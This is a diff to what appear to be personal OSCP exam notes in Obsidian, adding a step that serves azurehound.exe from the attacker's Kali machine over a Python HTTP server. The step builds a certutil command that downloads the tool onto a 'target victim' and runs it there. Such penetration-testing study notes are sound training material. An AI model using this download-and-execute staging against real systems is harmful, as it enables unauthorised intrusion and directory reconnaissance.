@@ -29,6 +29,25 @@ dv.paragraph("```bash\n" + command + "\n```");
 ```
 
 ---
+## Host azurehound.exe
+
+```
+cd ~/Desktop/Tools/Windows/Bloodhound && python -m http.server 80
+```
+
+Transfer azurehound.exe onto target victim
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+
+const command = `certutil -urlcache -split -f http://${KaliIP}:80/azurehound.exe azurehound.exe`;
+
+dv.paragraph("```bash\n" + command + "\n```");
+```
+```
+.\azurehound.exe
+```
+
+---
 
 Host sharphound.ps1
 ```
